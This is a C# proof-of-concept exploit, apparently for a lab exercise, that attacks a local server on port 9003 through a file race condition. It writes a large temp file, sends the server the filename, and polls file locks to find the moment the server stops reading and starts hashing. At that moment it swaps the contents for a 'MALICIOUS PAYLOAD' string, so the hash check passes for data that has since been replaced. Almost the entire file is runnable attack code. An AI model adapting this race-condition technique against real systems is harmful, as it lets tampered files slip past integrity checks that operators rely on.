using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

class Program
{
    static async Task Main()
    {
        // Dynamic path resolution ensures we don't guess folder locations
        string baseDir = Path.GetTempPath();

        // Cache-buster filename guarantees the server must read from the physical hard drive
        string fileName = "target_" + Guid.NewGuid().ToString().Substring(0, 8) + ".txt";
        string path = Path.Combine(baseDir, fileName);

        Console.WriteLine($"[ATTACKER] Forging physical anchor: {path}");

        using (var fs = new FileStream(path, FileMode.Create))
        {
            byte[] safeText = Encoding.UTF8.GetBytes("SAFE DATA\n");
            fs.Write(safeText, 0, safeText.Length);

            // 300MB of physical junk data
            byte[] chunk = new byte[1024 * 1024 * 10];
            for (int i = 0; i < chunk.Length; i++) chunk[i] = (byte)'X';
            for (int i = 0; i < 30; i++) fs.Write(chunk, 0, chunk.Length);
        }

        var s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        s.Connect(IPAddress.Loopback, 9003);
        Console.WriteLine("[ATTACKER] Connected. Firing trigger...");

        // 1. Fire Trigger
        s.Send(Encoding.UTF8.GetBytes(fileName));

        // 2. THE POLITE HEAD START
        // Give the server 30ms to clear T1 (File.Exists) and lock the file for T1.5 (ReadAllBytes).
        // If we don't do this, we crash the server via Denial of Service.
        await Task.Delay(30);

        bool lockDetected = false;

        Console.WriteLine("[ATTACKER] Shadowing server lock state...");

        //TO TRACE NUMBER OF LOOP
        int num = 0;
        // 3. ZERO-LATENCY HOT LOOP
        while (true)
        {
            num++;
            try
            {
                // Attempt an exclusive lock
                using (var fs = File.Open(path, FileMode.Open, FileAccess.Write, FileShare.None))
                {
                    if (lockDetected)
                    {
                        // THE SERVER DROPPED THE LOCK! 
                        // It is currently trapped in the CPU doing the SHA256 hash.
                        byte[] payload = Encoding.UTF8.GetBytes("MALICIOUS PAYLOAD");
                        fs.SetLength(0); // Wipe the 300MB
                        fs.Write(payload, 0, payload.Length);

                        Console.WriteLine("[ATTACKER] CRITICAL: File swapped exactly during SHA256 execution!");
                        break;
                    }
                }
            }
            catch (IOException)
            {
                Console.WriteLine("Number of Loop: " + num);
                // We hit the wall safely! The server is actively reading the file.
                lockDetected = true;
            }
        }

        s.Close();
        Console.WriteLine("[ATTACKER] Exploit routine finished.");
        Console.ReadLine(); // Keep console open
    }
}